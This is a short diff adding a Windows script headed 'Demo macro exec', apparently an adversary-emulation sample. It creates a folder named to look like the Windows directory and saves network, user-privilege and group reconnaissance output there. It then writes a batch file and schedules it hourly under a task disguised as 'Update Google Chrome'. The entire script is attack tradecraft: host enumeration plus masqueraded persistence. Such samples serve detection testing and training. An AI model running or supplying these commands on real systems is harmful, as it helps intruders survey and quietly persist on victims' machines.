@@ -1,0 +1,8 @@
+# Demo macro exec
+mkdir c:\windws
+ipconfig >> c:\windws\enum.txt
+netstat >> c:\windws\enum.txt
+whoami /priv >> c:\windws\enum.txt
+whoami /groups >> c:\windws\enum.txt
+write-output "dir c:\ > c:\windws\dir.txt"  > c:\temp\test.bat
+schtasks /create /sc hourly /tn "Update Google Chrome" /tr "cmd /c c:\temp\test.bat"
